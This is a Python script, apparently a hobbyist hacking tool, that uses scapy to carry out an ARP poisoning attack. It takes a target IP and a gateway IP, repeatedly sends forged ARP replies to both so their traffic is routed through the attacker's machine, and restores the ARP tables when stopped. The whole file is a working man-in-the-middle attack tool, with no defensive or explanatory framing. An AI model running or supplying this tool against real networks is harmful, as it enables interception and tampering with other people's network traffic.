import scapy.all as scapy
import optparse
import time

def mac_address_of(ip):
    arp_request_packet = scapy.ARP(pdst = ip)
    broadcast_packet = scapy.Ether()

    combined_packet = broadcast_packet/arp_request_packet

    answered_list = scapy.srp(combined_packet, timeout = 1, verbose = False)[0]

    return answered_list[0][1].hwsrc

def arp_poisinig(target_ip, poisened_ip):
    target_mac = mac_address_of(target_ip)

    ARP_response = scapy.ARP(op = 2, pdst = target_ip, psrc = poisened_ip, hwdst = target_mac)

    scapy.send(ARP_response, verbose = False)

def get_inputs():
    parser = optparse.OptionParser()

    parser.add_option('-t', '--target', dest = 'target_ip', help = 'Enter Target IP')
    parser.add_option('-g', '--gateway', dest = 'gateway_ip', help = 'Enter Gateway IP')

    options = parser.parse_args()[0]

    if not options.target_ip:
        print('enter target ip: ')
    if not options.gateway_ip:
        print('enter gateway_ip: ')

    return options

def stop_arp_poisining(fooled_ip, gateway_ip):
    fooled_mac = mac_address_of(fooled_ip)
    gateway_mac = mac_address_of(gateway_ip)
    ARP_response = scapy.ARP(op = 2, pdst = fooled_ip, hwdst = fooled_mac, psrc = gateway_ip, hwsrc = gateway_mac)
    scapy.send(ARP_response, verbose = False, count = 10)

number = 0

ips = get_inputs()
try:
    while True:
        arp_poisinig(ips.target_ip, ips.gateway_ip)
        arp_poisinig(ips.gateway_ip, ips.target_ip)
        number += 2
        print('\rsending packets = ' + str(number) + ' \n', end = ' ')
        time.sleep(3)
except KeyboardInterrupt:
    print('Keyboard interrupt\n')
    print('ARP poisinig has been terminated\n')
except IndexError:
    print('Router can have ARP mechanisms. The Attack was fail.')

    

